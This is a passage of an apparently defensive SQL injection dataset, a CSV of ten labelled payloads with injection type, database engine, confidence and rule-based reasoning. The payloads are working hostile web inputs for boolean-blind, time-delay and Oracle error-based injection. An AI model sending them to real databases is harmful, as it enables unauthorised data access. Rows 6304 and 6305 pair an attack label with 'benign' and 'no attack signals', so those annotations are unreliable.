row_index,payload_norm,label,sqli_type_hint,sqli_type,db_engine,confidence,reasoning,label_source
6300,-2303' ) ) as exyt where 2528 = 2528 or 8571 = 8571--,1,,boolean_blind,generic,0.95,2528 = 2528 or detected — boolean_blind injection (priority 8) on generic,rule-based
6301,"1 ) ) as wmxa where 6485 = 6485 and 8148 = like ( 'abcdefg',upper ( hex ( randomblob ( 500000000/2 ) ) ) ) --",1,,time_blind,sqlite,0.95,randomblob ( is SQLite-specific time-delay function — time-based blind inference (priority 5),rule-based
6302,1 ) where 2468 = 2468 and ( select * from ( select ( sleep ( 5 ) ) ) gcrr ) #,1,,time_blind,mysql,0.95,sleep ( is MySQL-specific time-delay function — time-based blind inference (priority 5),rule-based
6303,"1"" ) as uyms where 6210 = 6210 and 6055 = ctxsys.drithsx.sn ( 6055, ( chr ( 113 ) ||chr ( 113 ) ||chr ( 112 ) ||chr ( 106 ) ||chr ( 113 ) || ( select ( case when ( 6055 = 6055 ) then 1 else 0 end ) from dual ) ||chr ( 113 ) ||chr ( 122 ) ||chr ( 118 ) ||chr ( 122 ) ||chr ( 113 ) ) ) --",1,,error_based,oracle,0.95,ctxsys detected — error_based injection (priority 4) on oracle,rule-based
6304,1' where 6583 = 6583,1,,benign,generic,0.8,No attack signals detected in payload,rule-based
6305,"1"" or char ( 68 ) ||char ( 69 ) ||char ( 97 ) ||char ( 85 ) = regexp_substring ( repeat ( right ( char ( 5389 ) ,0 ) ,5000000000 ) ,null ) and ""bnyh"" = ""bnyh",1,,benign,generic,0.8,No attack signals detected in payload,rule-based
6306,"-5210"" ) where 7176 = 7176 or 6872 = 6872--",1,,boolean_blind,generic,0.95,7176 = 7176 or detected — boolean_blind injection (priority 8) on generic,rule-based
6307,"1' ) ) and make_set ( 1002 = 3556,3556 ) and ( ( 'mfao' = 'mfao",1,,boolean_blind,generic,0.95,) and ( detected — boolean_blind injection (priority 8) on generic,rule-based
6308,"-2583"" ) where 3455 = 3455 or make_set ( 9354 = 9354,7185 ) --",1,,boolean_blind,generic,0.95,3455 = 3455 or detected — boolean_blind injection (priority 8) on generic,rule-based
6309,"1%"" ) waitfor delay '0:0:5' and ( ""%"" = """,1,,time_blind,mssql,0.95,waitfor delay is MSSQL-specific time-delay function — time-based blind inference (priority 5),rule-based
